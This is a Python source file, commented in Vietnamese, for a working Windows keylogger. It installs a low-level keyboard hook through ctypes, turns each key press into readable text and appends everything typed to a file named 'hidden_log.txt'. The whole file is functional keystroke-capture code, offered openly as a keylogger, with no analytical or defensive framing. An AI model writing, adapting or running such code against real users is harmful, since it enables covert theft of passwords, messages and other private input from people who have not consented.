import ctypes
from ctypes import wintypes
import sys
import time

# Khai báo các thư viện lõi của Windows
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
PM_REMOVE = 1

# =====================================================================
# KHẮC PHỤC LỖI OVERFLOW TRÊN WINDOWS 64-BIT
# =====================================================================
user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p, wintypes.HINSTANCE, wintypes.DWORD]
user32.SetWindowsHookExW.restype = wintypes.HHOOK

user32.UnhookWindowsHookEx.argtypes = [wintypes.HHOOK]
user32.UnhookWindowsHookEx.restype = wintypes.BOOL

user32.CallNextHookEx.argtypes = [wintypes.HHOOK, ctypes.c_int, wintypes.WPARAM, ctypes.c_void_p]
user32.CallNextHookEx.restype = wintypes.LPARAM

kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
kernel32.GetModuleHandleW.restype = wintypes.HINSTANCE

# Các hằng số cấu hình Hook
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
LOG_FILE = "hidden_log.txt"

# BẢNG ÁNH XẠ MỞ RỘNG: Chuyển mã số thành ký tự tường minh
VK_MAP = {
    8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]\n", 
    16: "[SHIFT]", 160: "[L-SHIFT]", 161: "[R-SHIFT]",
    17: "[CTRL]", 162: "[L-CTRL]", 163: "[R-CTRL]", 
    18: "[ALT]", 164: "[L-ALT]", 165: "[R-ALT]",
    20: "[CAPSLOCK]", 27: "[ESC]", 32: " ",
    37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
    46: "[DELETE]", 91: "[WIN]", 92: "[WIN]",
    # Các phím ký tự đặc biệt (thường xuất hiện dưới dạng số trong log của bạn)
    186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/", 
    192: "`", 219: "[", 220: "\\", 221: "]", 222: "'",
    231: "" # Loại bỏ nhiễu UniKey
}

# Cấu trúc dữ liệu chứa thông tin phím bấm
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]

HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

hook_id = None

# Hàm Callback: Nơi đánh chặn dữ liệu
def hook_callback(nCode, wParam, lParam):
    global hook_id
    if nCode >= 0 and wParam == WM_KEYDOWN:
        kbd_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk_code = kbd_struct.vkCode
        
        # Kiểm tra trong bảng mã mở rộng
        if vk_code in VK_MAP:
            char = VK_MAP[vk_code]
        elif 32 <= vk_code <= 126:
            char = chr(vk_code)
        else:
            char = f"[{vk_code}]"
        
        if char:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(char)
                
    return user32.CallNextHookEx(hook_id, nCode, wParam, ctypes.c_void_p(lParam))

c_callback = HOOKPROC(hook_callback)

def main():
    global hook_id
    sys.stdout.reconfigure(encoding='utf-8')
    h_mod = kernel32.GetModuleHandleW(None)
    hook_pointer = ctypes.cast(c_callback, ctypes.c_void_p)
    
    hook_id = user32.SetWindowsHookExW(
        WH_KEYBOARD_LL,
        hook_pointer,
        h_mod,
        0 
    )

    if not hook_id:
        print(f"Lỗi: Không thể thiết lập Hook.")
        sys.exit(1)

    print("Keylogger dang chay... (Bang ma mo rong da kich hoat)")

    msg = wintypes.MSG()
    try:
        while True:
            if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, PM_REMOVE):
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
            else:
                time.sleep(0.01) 
                  
    except KeyboardInterrupt:
        print("\n[!] Da dung.")
      
    finally:
        if hook_id:
            user32.UnhookWindowsHookEx(hook_id)
            print("[*] Da go bo Hook an toan.")

if __name__ == "__main__":
    main()